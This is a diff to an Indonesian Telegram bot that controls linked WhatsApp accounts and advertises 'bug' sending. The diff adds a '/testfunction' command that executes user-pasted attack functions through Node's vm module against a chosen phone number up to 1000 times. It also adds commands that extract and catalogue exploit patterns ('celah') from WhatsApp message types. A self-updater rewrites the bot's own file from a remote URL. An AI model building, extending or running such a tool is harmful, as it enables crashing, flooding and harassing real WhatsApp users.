@@ -1,3 +1,4 @@
+```javascript
 const {
     default: makeWASocket,
     useMultiFileAuthState,
@@ -15,6 +16,7 @@ const moment = require('moment');
 const config = require("./setting/config.js");
 const TelegramBot = require("node-telegram-bot-api");
 const acorn = require("acorn");
+const vm = require("vm");
 const BOT_TOKEN = config.BOT_TOKEN;
 const SESSIONS_DIR = "./sessions";
 const SESSIONS_FILE = "./sessions/active_sessions.json";
@@ -24,8 +26,9 @@ const thumbnailUrl = "https://files.catbox.moe/6ogo26.jpg";
 
 // Konfigurasi GitHub Auto Update
 const GITHUB_RAW_URL = "https://raw.githubusercontent.com/sihalohoalexander389-oss/primrose-bot/main/index.js";
-const CURRENT_VERSION = "3.0.11";
+const CURRENT_VERSION = "3.0.9";
 const AUTO_UPDATE_FILE = "./database/auto_update.json";
+const PENDING_UPDATE_FILE = "./database/pending_update.json";
 
 // Load auto update setting
 let autoUpdateEnabled = true;
@@ -51,6 +54,35 @@ function saveAutoUpdateSetting(enabled) {
     }
 }
 
+// Save pending update notification
+function savePendingUpdate(chatId, oldVersion, newVersion) {
+    try {
+        fs.writeFileSync(PENDING_UPDATE_FILE, JSON.stringify({ chatId, oldVersion, newVersion, timestamp: Date.now() }, null, 2));
+    } catch (error) {
+        console.error("Error saving pending update:", error);
+    }
+}
+
+function getPendingUpdate() {
+    try {
+        if (!fs.existsSync(PENDING_UPDATE_FILE)) return null;
+        return JSON.parse(fs.readFileSync(PENDING_UPDATE_FILE));
+    } catch (error) {
+        console.error("Error getting pending update:", error);
+        return null;
+    }
+}
+
+function clearPendingUpdate() {
+    try {
+        if (fs.existsSync(PENDING_UPDATE_FILE)) {
+            fs.unlinkSync(PENDING_UPDATE_FILE);
+        }
+    } catch (error) {
+        console.error("Error clearing pending update:", error);
+    }
+}
+
 // Inisialisasi auto update setting
 const autoUpdateSetting = loadAutoUpdateSetting();
 autoUpdateEnabled = autoUpdateSetting.enabled;
@@ -59,6 +91,7 @@ autoUpdateEnabled = autoUpdateSetting.enabled;
 const GROUP_PREMIUM_FILE = "./database/group_premium.json";
 const BLOCKED_COMMANDS_FILE = "./database/blocked_commands.json";
 const COLOR_SETTING_FILE = "./database/color_setting.json";
+const CELAH_DATABASE_FILE = "./database/celah_database.json";
 
 // Load data grup premium
 let groupPremiumData = [];
@@ -81,6 +114,30 @@ function saveGroupPremiumData(data) {
         fs.writeFileSync(GROUP_PREMIUM_FILE, JSON.stringify(data, null, 2));
     } catch (error) {
         console.error("Error saving group premium data:", error);
+    }
+}
+
+// Load celah database
+let celahDatabase = [];
+
+function loadCelahDatabase() {
+    try {
+        if (!fs.existsSync(CELAH_DATABASE_FILE)) {
+            fs.writeFileSync(CELAH_DATABASE_FILE, JSON.stringify([], null, 2));
+            return [];
+        }
+        return JSON.parse(fs.readFileSync(CELAH_DATABASE_FILE));
+    } catch (error) {
+        console.error("Error loading celah database:", error);
+        return [];
+    }
+}
+
+function saveCelahDatabase(data) {
+    try {
+        fs.writeFileSync(CELAH_DATABASE_FILE, JSON.stringify(data, null, 2));
+    } catch (error) {
+        console.error("Error saving celah database:", error);
     }
 }
 
@@ -134,9 +191,19 @@ function saveColorSetting(color) {
 
 // Inisialisasi data
 groupPremiumData = loadGroupPremiumData();
+celahDatabase = loadCelahDatabase();
 blockedCommands = loadBlockedCommands();
 const colorSetting = loadColorSetting();
 currentColor = colorSetting.color;
+
+// Cek pending update setelah restart
+const pendingUpdate = getPendingUpdate();
+if (pendingUpdate) {
+    setTimeout(() => {
+        console.log(chalk.green(`✅ Update completed! Version ${pendingUpdate.oldVersion} → ${pendingUpdate.newVersion}`));
+        clearPendingUpdate();
+    }, 2000);
+}
 
 // Fungsi untuk mengecek update dari GitHub
 async function checkForUpdates() {
@@ -171,6 +238,11 @@ async function performUpdate(chatId) {
                 await bot.sendMessage(chatId, `✅ Bot sudah versi terbaru! (v${CURRENT_VERSION})`);
             }
             return false;
+        }
+        
+        // Simpan pending update untuk notifikasi setelah restart
+        if (chatId) {
+            savePendingUpdate(chatId, CURRENT_VERSION, update.newVersion);
         }
         
         fs.writeFileSync(__filename, update.content);
@@ -252,6 +324,19 @@ console.log(chalk.blue(`
 };
 
 const bot = new TelegramBot(BOT_TOKEN, { polling: true });
+
+// Kirim notifikasi jika ada update yang tertunda
+setTimeout(async () => {
+    const pending = getPendingUpdate();
+    if (pending && pending.chatId) {
+        try {
+            await bot.sendMessage(pending.chatId, `✅ *VERSI SUDAH NEW!*\n\nVersi ${pending.oldVersion} → ${pending.newVersion}\nSilakan ketik /start untuk menggunakan bot kembali.\n\n© Primrose Linux Bot`, { parse_mode: "Markdown" });
+            clearPendingUpdate();
+        } catch (e) {
+            console.error("Error sending pending notification:", e);
+        }
+    }
+}, 3000);
 
 function ensureFileExists(filePath, defaultData = []) {
     if (!fs.existsSync(filePath)) {
@@ -614,7 +699,7 @@ async function sendColoredMenu(chatId, from, color, editMessageId = null) {
   const caption = `<blockquote><strong>☠ # Primrose Linux Bot 𖣂 ☠</strong></blockquote>
 🎩 Pemilik : @ItsMeXanderRzMd 🌟    
 😄 Owner : @realmarz 🌟
-🍽 Version : 3.0 
+🍽 Version : ${CURRENT_VERSION} 
 🗡 Platform : Telegram
 <blockquote><b>――⧼ STATUS BOT ⧽――</b></blockquote>
 ⛧ Status : ${status}
@@ -828,9 +913,43 @@ async function addMemberPremiumFromGroup(chatId, userId, username, days) {
 
 const pendingColorPoll = {};
 
-// ================= FITUR CEKFUNC ================= //
+// ================= EXTRACT CELAH/PATTERN ================= //
+function extractCelah(code) {
+    const patterns = {
+        'groupInviteMessage': /groupInviteMessage\s*:\s*{([^}]+)}/gs,
+        'newsletterAdminInviteMessage': /newsletterAdminInviteMessage\s*:\s*{([^}]+)}/gs,
+        'interactiveResponseMessage': /interactiveResponseMessage\s*:\s*{([^}]+)}/gs,
+        'viewOnceMessage': /viewOnceMessage\s*:\s*{([^}]+)}/gs,
+        'stickerMessage': /stickerMessage\s*:\s*{([^}]+)}/gs,
+        'videoMessage': /videoMessage\s*:\s*{([^}]+)}/gs,
+        'contactMessage': /contactMessage\s*:\s*{([^}]+)}/gs,
+        'groupStatusMessageV2': /groupStatusMessageV2\s*:\s*{([^}]+)}/gs,
+        'interactiveMessage': /interactiveMessage\s*:\s*{([^}]+)}/gs,
+        'nativeFlowMessage': /nativeFlowMessage\s*:\s*{([^}]+)}/gs,
+        'buttons': /buttons\s*:\s*\[([^\]]+)\]/gs,
+        'contextInfo': /contextInfo\s*:\s*{([^}]+)}/gs,
+        'templateMessage': /templateMessage\s*:\s*{([^}]+)}/gs,
+        'stickerPackMessage': /stickerPackMessage\s*:\s*{([^}]+)}/gs,
+        'eventMessage': /eventMessage\s*:\s*{([^}]+)}/gs
+    };
 
-// Fungsi untuk memperbaiki kode JavaScript secara otomatis 100% akurat
+    let results = [];
+    
+    for (const [type, pattern] of Object.entries(patterns)) {
+        const matches = code.matchAll(pattern);
+        for (const match of matches) {
+            results.push({
+                type: type,
+                content: match[0].trim(),
+                fullMatch: match[0]
+            });
+        }
+    }
+    
+    return results;
+}
+
+// ================= FITUR CEKFUNC & AUTO FIX ================= //
 function autoFixJavaScript(code, error) {
     let fixed = code;
     const fixes = [];
@@ -897,13 +1016,13 @@ function autoFixJavaScript(code, error) {
     
     // 8. Fix missing return in async function
     if (fixed.includes('async function') && !fixed.includes('return')) {
-        const lines = fixed.split('\n');
-        for (let i = 0; i < lines.length; i++) {
-            if (lines[i].includes('async function') && lines[i+1] && lines[i+1].includes('{')) {
-                const lastBraceIndex = lines.length - 1;
-                for (let j = lines.length - 1; j > i; j--) {
-                    if (lines[j].includes('}')) {
-                        lines[j] = '  return true;\n' + lines[j];
+        const linesArr = fixed.split('\n');
+        for (let i = 0; i < linesArr.length; i++) {
+            if (linesArr[i].includes('async function') && linesArr[i+1] && linesArr[i+1].includes('{')) {
+                const lastBraceIndex = linesArr.length - 1;
+                for (let j = linesArr.length - 1; j > i; j--) {
+                    if (linesArr[j].includes('}')) {
+                        linesArr[j] = '  return true;\n' + linesArr[j];
                         fixes.push('Added return statement');
                         break;
                     }
@@ -911,11 +1030,11 @@ function autoFixJavaScript(code, error) {
                 break;
             }
         }
-        fixed = lines.join('\n');
+        fixed = linesArr.join('\n');
     }
     
     // 9. Fix missing parameters in function
-    if (fixed.match(/function\s+\w+\s*\(\s*\)/) && fixed.includes('sock') || fixed.includes('target')) {
+    if (fixed.match(/function\s+\w+\s*\(\s*\)/) && (fixed.includes('sock') || fixed.includes('target'))) {
         fixed = fixed.replace(/function\s+(\w+)\s*\(\s*\)/, 'function $1(sock, target)');
         fixes.push('Added missing parameters (sock, target)');
     }
@@ -929,6 +1048,41 @@ function autoFixJavaScript(code, error) {
     }
     
     return { fixed, fixes };
+}
+
+// ================= FITUR TESTFUNCTION ================= //
+async function executeTestFunction(sock, target, funcCode, jumlah) {
+    try {
+        const matchFunc = funcCode.match(/async function\s+(\w+)/);
+        if (!matchFunc) return false;
+        
+        const funcName = matchFunc[1];
+        
+        const sandbox = {
+            console,
+            Buffer,
+            sock: sock,
+            target,
+            sleep,
+            generateWAMessageFromContent,
+        };
+        
+        const context = vm.createContext(sandbox);
+        const wrapper = `${funcCode}\n${funcName}(sock, target)`;
+        
+        for (let i = 0; i < jumlah; i++) {
+            try {
+                vm.runInContext(wrapper, context);
+            } catch (err) {
+                console.error("Error executing function:", err.message);
+            }
+            await sleep(200);
+        }
+        return true;
+    } catch (error) {
+        console.error("Error in executeTestFunction:", error.message);
+        return false;
+    }
 }
 
 bot.onText(/\/cekfunc/, async (msg) => {
@@ -1004,11 +1158,406 @@ bot.onText(/\/cekfunc/, async (msg) => {
     }
 });
 
-// Handler untuk auto fix
+// ================= FITUR CELAHFUNC ================= //
+bot.onText(/\/celahfunc/, async (msg) => {
+    const chatId = msg.chat.id;
+    const userId = msg.from.id;
+    const chatType = msg.chat.type;
+    
+    const hasAccess = await checkUserAccess(userId, chatId, chatType, "celahfunc");
+    if (!hasAccess) return;
+    
+    if (!msg.reply_to_message || (!msg.reply_to_message.text && !msg.reply_to_message.document)) {
+        return bot.sendMessage(chatId, "⚠️ *CARA PAKE:*\n1. Kirim code JavaScript\n2. Reply code tersebut\n3. Ketik /celahfunc", { parse_mode: "Markdown" });
+    }
+    
+    let code = '';
+    
+    if (msg.reply_to_message.text) {
+        code = msg.reply_to_message.text;
+    } else if (msg.reply_to_message.document) {
+        const file = await bot.getFile(msg.reply_to_message.document.file_id);
+        const fileUrl = `https://api.telegram.org/file/bot${BOT_TOKEN}/${file.file_path}`;
+        const response = await axios.get(fileUrl);
+        code = response.data;
+    }
+    
+    const loadingMsg = await bot.sendMessage(chatId, "🔍 *Menganalisis celah...*", { parse_mode: "Markdown" });
+    
+    const celah = extractCelah(code);
+    
+    if (celah.length === 0) {
+        await bot.editMessageText("❌ *Tidak ditemukan celah/pattern dalam code!*\n\n💡 Gunakan /addcelah untuk menambahkan celah baru ke database.", {
+            chat_id: chatId,
+            message_id: loadingMsg.message_id,
+            parse_mode: "Markdown"
+        });
+        return;
+    }
+    
+    let response = `<blockquote>🔍 CELAH DITEMUKAN</blockquote>\n\n`;
+    response += `Total: ${celah.length} celah\n━━━━━━━━━━━━━━━━━━\n\n`;
+    
+    for (let i = 0; i < Math.min(celah.length, 10); i++) {
+        response += `<b>${i+1}. Type: ${celah[i].type}</b>\n`;
+        response += `<code>${celah[i].content.substring(0, 600)}</code>\n`;
+        if (celah[i].content.length > 600) response += `\n... (${celah[i].content.length - 600} chars terpotong)\n`;
+        response += `━━━━━━━━━━━━━━━━━━\n\n`;
+    }
+    
+    await bot.editMessageText(response, {
+        chat_id: chatId,
+        message_id: loadingMsg.message_id,
+        parse_mode: "HTML"
+    });
+});
+
+// ================= FITUR ADD CELAH ================= //
+bot.onText(/\/addcelah/, async (msg) => {
+    const chatId = msg.chat.id;
+    const userId = msg.from.id;
+    const chatType = msg.chat.type;
+    
+    const hasAccess = await checkUserAccess(userId, chatId, chatType, "addcelah");
+    if (!hasAccess) return;
+    
+    if (!msg.reply_to_message || (!msg.reply_to_message.text && !msg.reply_to_message.document)) {
+        return bot.sendMessage(chatId, "⚠️ *CARA PAKE:*\n1. Kirim code JavaScript\n2. Reply code tersebut\n3. Ketik /addcelah", { parse_mode: "Markdown" });
+    }
+    
+    let code = '';
+    
+    if (msg.reply_to_message.text) {
+        code = msg.reply_to_message.text;
+    } else if (msg.reply_to_message.document) {
+        const file = await bot.getFile(msg.reply_to_message.document.file_id);
+        const fileUrl = `https://api.telegram.org/file/bot${BOT_TOKEN}/${file.file_path}`;
+        const response = await axios.get(fileUrl);
+        code = response.data;
+    }
+    
+    const loadingMsg = await bot.sendMessage(chatId, "💾 *Menyimpan celah ke database...*", { parse_mode: "Markdown" });
+    
+    const celah = extractCelah(code);
+    
+    if (celah.length === 0) {
+        await bot.editMessageText("❌ *Tidak ditemukan celah/pattern dalam code!* Tidak ada yang bisa disimpan.", {
+            chat_id: chatId,
+            message_id: loadingMsg.message_id,
+            parse_mode: "Markdown"
+        });
+        return;
+    }
+    
+    let addedCount = 0;
+    for (const c of celah) {
+        const exists = celahDatabase.some(item => item.type === c.type && item.content === c.content);
+        if (!exists) {
+            celahDatabase.push({
+                id: Date.now().toString(36) + Math.random().toString(36).substring(2, 8),
+                type: c.type,
+                content: c.content,
+                addedBy: userId,
+                addedAt: Date.now()
+            });
+            addedCount++;
+        }
+    }
+    
+    saveCelahDatabase(celahDatabase);
+    
+    await bot.editMessageText(`✅ *Berhasil menyimpan ${addedCount} celah baru ke database!*\n\n📊 Total celah tersimpan: ${celahDatabase.length}`, {
+        chat_id: chatId,
+        message_id: loadingMsg.message_id,
+        parse_mode: "Markdown"
+    });
+});
+
+// ================= FITUR LIST CELAH ================= //
+bot.onText(/\/listcelah/, async (msg) => {
+    const chatId = msg.chat.id;
+    const userId = msg.from.id;
+    const chatType = msg.chat.type;
+    
+    const hasAccess = await checkUserAccess(userId, chatId, chatType, "listcelah");
+    if (!hasAccess) return;
+    
+    if (celahDatabase.length === 0) {
+        return bot.sendMessage(chatId, "📌 *Belum ada celah tersimpan di database.*\n\nGunakan /addcelah untuk menambahkan.", { parse_mode: "Markdown" });
+    }
+    
+    let response = `<blockquote>📋 DAFTAR CELAH TERSIMPAN</blockquote>\n\n`;
+    response += `Total: ${celahDatabase.length} celah\n━━━━━━━━━━━━━━━━━━\n\n`;
+    
+    for (let i = 0; i < Math.min(celahDatabase.length, 15); i++) {
+        const celah = celahDatabase[i];
+        response += `<b>${i+1}. ID: ${celah.id}</b>\n`;
+        response += `<b>Type:</b> ${celah.type}\n`;
+        response += `<b>Content:</b>\n<code>${celah.content.substring(0, 300)}</code>\n`;
+        if (celah.content.length > 300) response += `...\n`;
+        response += `━━━━━━━━━━━━━━━━━━\n\n`;
+    }
+    
+    if (celahDatabase.length > 15) {
+        response += `\n... dan ${celahDatabase.length - 15} celah lainnya\n`;
+        response += `Gunakan /delcelah <id> untuk menghapus\n`;
+    }
+    
+    await bot.sendMessage(chatId, response, { parse_mode: "HTML" });
+});
+
+// ================= FITUR DEL CELAH ================= //
+bot.onText(/\/delcelah (\w+)/, async (msg, match) => {
+    const chatId = msg.chat.id;
+    const userId = msg.from.id;
+    const chatType = msg.chat.type;
+    
+    const hasAccess = await checkUserAccess(userId, chatId, chatType, "delcelah");
+    if (!hasAccess) return;
+    
+    const id = match[1];
+    const index = celahDatabase.findIndex(c => c.id === id);
+    
+    if (index === -1) {
+        return bot.sendMessage(chatId, `❌ Celah dengan ID ${id} tidak ditemukan.`);
+    }
+    
+    const removed = celahDatabase.splice(index, 1)[0];
+    saveCelahDatabase(celahDatabase);
+    
+    await bot.sendMessage(chatId, `✅ *Berhasil menghapus celah!*\n\nType: ${removed.type}\nID: ${removed.id}`, { parse_mode: "Markdown" });
+});
+
+// ================= FITUR TESTFUNCTION ================= //
+bot.onText(/\/testfunction(?:\s+(\d+)\s+(\d+))?/, async (msg, match) => {
+    const chatId = msg.chat.id;
+    const userId = msg.from.id;
+    const chatType = msg.chat.type;
+    
+    const hasAccess = await checkUserAccess(userId, chatId, chatType, "testfunction");
+    if (!hasAccess) return;
+    
+    if (!msg.reply_to_message || !msg.reply_to_message.text) {
+        return bot.sendMessage(chatId, "⚠️ *CARA PAKE:*\n1. Reply function JavaScript\n2. Ketik /testfunction <nomor> <jumlah>", { parse_mode: "Markdown" });
+    }
+    
+    const args = msg.text.split(" ");
+    if (args.length < 3) {
+        return bot.sendMessage(chatId, "🪧 Example : /testfunction 62xxx 10 (reply function)");
+    }
+    
+    const q = args[1];
+    let jumlah = Math.max(0, Math.min(parseInt(args[2]) || 1, 1000));
+    
+    if (isNaN(jumlah) || jumlah <= 0) {
+        return bot.sendMessage(chatId, "❌ Jumlah harus angka");
+    }
+    
+    const targetNumber = q.replace(/[^0-9]/g, "");
+    const target = `${targetNumber}@s.whatsapp.net`;
+    
+    if (sessions.size === 0) {
+        return bot.sendMessage(chatId, "❌ Tidak ada sender WhatsApp terhubung.");
+    }
+    
+    const sock = sessions.values().next().value;
+    const funcCode = msg.reply_to_message.text;
+    
+    const loadingMsg = await bot.sendMessage(chatId, "🚀 *Memproses testfunction...*", { parse_mode: "Markdown" });
+    
+    const success = await executeTestFunction(sock, target, funcCode, jumlah);
+    
+    if (success) {
+        await bot.editMessageText(`✅ *Testfunction selesai!*\n\nTarget: ${targetNumber}\nJumlah: ${jumlah}x\nStatus: Success\n\n© Primrose Linux Bot`, {
+            chat_id: chatId,
+            message_id: loadingMsg.message_id,
+            parse_mode: "Markdown"
+        });
+    } else {
+        await bot.editMessageText(`❌ *Testfunction gagal!*\n\nTarget: ${targetNumber}\nJumlah: ${jumlah}x\nStatus: Failed\n\n© Primrose Linux Bot`, {
+            chat_id: chatId,
+            message_id: loadingMsg.message_id,
+            parse_mode: "Markdown"
+        });
+    }
+});
+
+// ================= FITUR PREMIUM & ADMIN ================= //
+
+// /addprem
+const pendingPremiumPoll = {};
+
+bot.onText(/\/addprem\s+(\d+)/, async (msg, match) => {
+    const chatId = msg.chat.id;
+    const userId = msg.from.id;
+    const targetUserId = parseInt(match[1]);
+    
+    if (!isOwner(userId) && !adminUsers.includes(userId)) {
+        return bot.sendMessage(chatId, "❌ Akses ditolak! Hanya owner/admin yang bisa menggunakan command ini.");
+    }
+    
+    const existing = premiumUsers.find(u => u.id === targetUserId);
+    if (existing) {
+        return bot.sendMessage(chatId, `⚠️ User ${targetUserId} sudah menjadi premium user.`);
+    }
+    
+    const options = ["💎 7 Hari", "👑 14 Hari", "🚀 30 Hari", "♾️ Permanent"];
+    
+    const poll = await bot.sendPoll(chatId, "💎 PILIH DURASI PREMIUM", options, { is_anonymous: false });
+    
+    pendingPremiumPoll[poll.poll.id] = {
+        userId: targetUserId,
+        adminId: userId,
+        chatId: chatId
+    };
+});
+
+// /delprem
+bot.onText(/\/delprem\s+(\d+)/, async (msg, match) => {
+    const chatId = msg.chat.id;
+    const userId = msg.from.id;
+    const targetUserId = parseInt(match[1]);
+    
+    if (!isOwner(userId) && !adminUsers.includes(userId)) {
+        return bot.sendMessage(chatId, "❌ Akses ditolak! Hanya owner/admin yang bisa menggunakan command ini.");
+    }
+    
+    const index = premiumUsers.findIndex(u => u.id === targetUserId);
+    if (index === -1) {
+        return bot.sendMessage(chatId, `❌ User ${targetUserId} tidak ditemukan dalam daftar premium.`);
+    }
+    
+    premiumUsers.splice(index, 1);
+    savePremiumUsers();
+    
+    bot.sendMessage(chatId, `✅ User ${targetUserId} berhasil dihapus dari daftar premium.`);
+});
+
+// /addadmin
+bot.onText(/\/addadmin\s+(\d+)/, async (msg, match) => {
+    const chatId = msg.chat.id;
+    const userId = msg.from.id;
+    const targetUserId = parseInt(match[1]);
+    
+    if (!isOwner(userId)) {
+        return bot.sendMessage(chatId, "❌ Akses ditolak! Hanya owner yang bisa menggunakan command ini.");
+    }
+    
+    if (adminUsers.includes(targetUserId)) {
+        return bot.sendMessage(chatId, `⚠️ User ${targetUserId} sudah menjadi admin.`);
+    }
+    
+    adminUsers.push(targetUserId);
+    saveAdminUsers();
+    
+    bot.sendMessage(chatId, `✅ User ${targetUserId} berhasil ditambahkan sebagai admin.`);
+});
+
+// /deladmin
+bot.onText(/\/deladmin\s+(\d+)/, async (msg, match) => {
+    const chatId = msg.chat.id;
+    const userId = msg.from.id;
+    const targetUserId = parseInt(match[1]);
+    
+    if (!isOwner(userId)) {
+        return bot.sendMessage(chatId, "❌ Akses ditolak! Hanya owner yang bisa menggunakan command ini.");
+    }
+    
+    const index = adminUsers.indexOf(targetUserId);
+    if (index === -1) {
+        return bot.sendMessage(chatId, `❌ User ${targetUserId} tidak ditemukan dalam daftar admin.`);
+    }
+    
+    adminUsers.splice(index, 1);
+    saveAdminUsers();
+    
+    bot.sendMessage(chatId, `✅ User ${targetUserId} berhasil dihapus dari daftar admin.`);
+});
+
+// /listprem
+bot.onText(/\/listprem/, async (msg) => {
+    const chatId = msg.chat.id;
+    const userId = msg.from.id;
+    
+    if (!isOwner(userId) && !adminUsers.includes(userId)) {
+        return bot.sendMessage(chatId, "❌ Akses ditolak! Hanya owner/admin yang bisa menggunakan command ini.");
+    }
+    
+    if (premiumUsers.length === 0) {
+        return bot.sendMessage(chatId, "📌 Belum ada premium user.");
+    }
+    
+    let message = `<blockquote>📋 Daftar Premium User</blockquote>\n\n`;
+    premiumUsers.forEach((user, index) => {
+        const expires = moment(user.expiresAt).format('YYYY-MM-DD HH:mm:ss');
+        message += `${index + 1}. ID: <code>${user.id}</code>\n   Expires: ${expires}\n\n`;
+    });
+    
+    bot.sendMessage(chatId, message, { parse_mode: "HTML" });
+});
+
+// /listadmin
+bot.onText(/\/listadmin/, async (msg) => {
+    const chatId = msg.chat.id;
+    const userId = msg.from.id;
+    
+    if (!isOwner(userId) && !adminUsers.includes(userId)) {
+        return bot.sendMessage(chatId, "❌ Akses ditolak! Hanya owner/admin yang bisa menggunakan command ini.");
+    }
+    
+    if (adminUsers.length === 0) {
+        return bot.sendMessage(chatId, "📌 Belum ada admin.");
+    }
+    
+    let message = `<blockquote>📋 Daftar Admin</blockquote>\n\n`;
+    adminUsers.forEach((admin, index) => {
+        message += `${index + 1}. ID: <code>${admin}</code>\n\n`;
+    });
+    
+    bot.sendMessage(chatId, message, { parse_mode: "HTML" });
+});
+
+// Poll handler untuk premium
+bot.on("poll_answer", async (answer) => {
+    const pollData = pendingPremiumPoll[answer.poll_id];
+    if (!pollData) return;
+    if (answer.user.id !== pollData.adminId) return;
+    
+    const choice = answer.option_ids[0];
+    let days;
+    if (choice === 0) days = 7;
+    if (choice === 1) days = 14;
+    if (choice === 2) days = 30;
+    if (choice === 3) days = "permanent";
+    
+    let expiresAt;
+    if (days === "permanent") {
+        expiresAt = "permanent";
+    } else {
+        expiresAt = Date.now() + days * 86400000;
+    }
+    
+    const existing = premiumUsers.find(u => u.id === pollData.userId);
+    if (!existing) {
+        premiumUsers.push({ id: pollData.userId, expiresAt });
+    } else {
+        existing.expiresAt = expiresAt;
+    }
+    
+    savePremiumUsers();
+    
+    bot.sendMessage(pollData.chatId, `✅ Premium berhasil ditambahkan\n\n👤 User ID: ${pollData.userId}\n⏳ Durasi: ${days === "permanent" ? "Permanent" : days + " Hari"}`);
+    
+    delete pendingPremiumPoll[answer.poll_id];
+});
+
+// ================= CALLBACK QUERY HANDLER ================= //
 bot.on("callback_query", async (query) => {
     const chatId = query.message.chat.id;
     const messageId = query.message.message_id;
     const data = query.data;
+    const userId = query.from.id;
+    const currentMessageId = query.message.message_id;
     
     if (data && data.startsWith("autofix_")) {
         const originalMsgId = parseInt(data.replace("autofix_", ""));
@@ -1041,10 +1590,19 @@ bot.on("callback_query", async (query) => {
         }
         
         delete global.pendingFix[originalMsgId];
-    } else if (data === "trashmenu" || data === "owner_menu" || data === "group_security_menu" || data === "toolsbug_menu" || data === "change_color_menu" || data === "back_to_main") {
-        // Handle menu callbacks yang sudah ada
-        const userId = query.from.id;
-        const currentMessageId = query.message.message_id;
+    }
+    // Menu callbacks
+    else if (data === "trashmenu" || data === "owner_menu" || data === "group_security_menu" || data === "toolsbug_menu" || data === "change_color_menu" || data === "back_to_main") {
+        
+        if (buttonIntervals.has(currentMessageId)) {
+            clearInterval(buttonIntervals.get(currentMessageId));
+            buttonIntervals.delete(currentMessageId);
+        }
+        if (globalIntervalId) {
+            clearInterval(globalIntervalId);
+            globalIntervalId = null;
+        }
+        discoActive = false;
         
         let caption = "";
         let replyMarkup = {};
@@ -1055,7 +1613,7 @@ bot.on("callback_query", async (query) => {
 <b>─━━─━━⧼ INFORMASI USER ⧽─━━─━━:</b>
 🎩 Pemilik : @ItsMeXanderRzMd 🌟    
 😄 Owner : @realmarz 🌟
-🍽 Version : 3.0
+🍽 Version : ${CURRENT_VERSION}
 🗡 Platform : Telegram
 <b>─━━─━━⧼ FITUR BUG ⧽─━━─━━:</b>
 ─▢ /sendbug +628
@@ -1083,19 +1641,21 @@ bot.on("callback_query", async (query) => {
             caption = `<blockquote><b>☠ PRIMROSE LINUX BOT ACCESS ☠</b></blockquote>
 🎩 Pemilik : @ItsMeXanderRzMd 🌟    
 😄 Owner : @realmarz 🌟
-🍽 Version : 3.0
+🍽 Version : ${CURRENT_VERSION}
 🗡 Platform : Telegram     
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-┃      ▢ /addprem id ☇ days
-┃      ╰➤ Menambahkan akses pada user
-┃      ▢ /delprem id
-┃      ╰➤ Menghapus akses pada user
-┃      ▢ /addadmin id
+┃      ▢ /addprem &lt;id&gt;
+┃      ╰➤ Menambahkan akses premium pada user
+┃      ▢ /delprem &lt;id&gt;
+┃      ╰➤ Menghapus akses premium pada user
+┃      ▢ /addadmin &lt;id&gt;
 ┃      ╰➤ Menambahkan akses admin pada user
-┃      ▢ /deladmin id
+┃      ▢ /deladmin &lt;id&gt;
 ┃      ╰➤ Menghapus akses admin pada user
 ┃      ▢ /listprem
 ┃      ╰➤ Melihat list premium user yang ada
+┃      ▢ /listadmin
+┃      ╰➤ Melihat list admin
 ┃      ▢ /reqpair ☇ Number
 ┃      ╰➤ Menambah Sender WhatsApp
 ┃      ▢ /update on/off
@@ -1140,10 +1700,14 @@ Command hanya bisa digunakan oleh admin grup</blockquote>`
 ┃      ╰➤ Reply dengan function bug
 ┃      ▢ /celahfunc &lt;reply func atau file&gt;
 ┃      ╰➤ Extract celah dari function
+┃      ▢ /addcelah &lt;reply func atau file&gt;
+┃      ╰➤ Menyimpan celah ke database
+┃      ▢ /listcelah
+┃      ╰➤ Menampilkan semua celah tersimpan
+┃      ▢ /delcelah &lt;id&gt;
+┃      ╰➤ Menghapus celah dari database
 ┃      ▢ /cekfunc &lt;reply func&gt;
 ┃      ╰➤ Cek error function + auto fix 100%
-┃      ▢ /fix &lt;reply code&gt;
-┃      ╰➤ Perbaiki code JavaScript otomatis
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 <blockquote><b>NOTE:</b>
 Gunakan tools ini untuk testing dan debugging</blockquote>`
@@ -1221,7 +1785,7 @@ Gunakan tools ini untuk testing dan debugging</blockquote>`
             const caption = `<blockquote><strong>☠ # Primrose Linux Bot 𖣂 ☠</strong></blockquote>
 🎩 Pemilik : @ItsMeXanderRzMd 🌟    
 😄 Owner : @realmarz 🌟
-🍽 Version : 3.0 
+🍽 Version : ${CURRENT_VERSION} 
 🗡 Platform : Telegram
 <blockquote><b>――⧼ STATUS BOT ⧽――</b></blockquote>
 ⛧ Status : ${status}
@@ -1339,290 +1903,292 @@ Gunakan tools ini untuk testing dan debugging</blockquote>`
     }
 });
 
+// Poll color handler
 bot.on("poll_answer", async (answer) => {
-  const pollData = pendingColorPoll[answer.poll_id]
-  if (!pollData) return
-  
-  const selectedOption = answer.option_ids[0]
-  let selectedColor = ""
-  
-  if (selectedOption === 0) selectedColor = "XRED"
-  else if (selectedOption === 1) selectedColor = "XBLUE"
-  else if (selectedOption === 2) selectedColor = "XGREEN"
-  else if (selectedOption === 3) selectedColor = "XWHITE"
-  else if (selectedOption === 4) selectedColor = "XDISCO"
-  
-  const colorValue = getColorFromChoice(selectedColor)
-  saveColorSetting(colorValue)
-  currentColor = colorValue
-  
-  if (buttonIntervals.has(pollData.currentMessageId)) {
-    clearInterval(buttonIntervals.get(pollData.currentMessageId))
-    buttonIntervals.delete(pollData.currentMessageId)
-  }
-  if (globalIntervalId) {
-    clearInterval(globalIntervalId)
-    globalIntervalId = null
-  }
-  discoActive = false
-  
-  await sendColoredMenu(pollData.chatId, pollData.from, colorValue, pollData.currentMessageId)
-  
-  delete pendingColorPoll[answer.poll_id]
-})
+    const pollData = pendingColorPoll[answer.poll_id];
+    if (!pollData) return;
+    
+    const selectedOption = answer.option_ids[0];
+    let selectedColor = "";
+    
+    if (selectedOption === 0) selectedColor = "XRED";
+    else if (selectedOption === 1) selectedColor = "XBLUE";
+    else if (selectedOption === 2) selectedColor = "XGREEN";
+    else if (selectedOption === 3) selectedColor = "XWHITE";
+    else if (selectedOption === 4) selectedColor = "XDISCO";
+    
+    const colorValue = getColorFromChoice(selectedColor);
+    saveColorSetting(colorValue);
+    currentColor = colorValue;
+    
+    if (buttonIntervals.has(pollData.currentMessageId)) {
+        clearInterval(buttonIntervals.get(pollData.currentMessageId));
+        buttonIntervals.delete(pollData.currentMessageId);
+    }
+    if (globalIntervalId) {
+        clearInterval(globalIntervalId);
+        globalIntervalId = null;
+    }
+    discoActive = false;
+    
+    await sendColoredMenu(pollData.chatId, pollData.from, colorValue, pollData.currentMessageId);
+    
+    delete pendingColorPoll[answer.poll_id];
+});
 
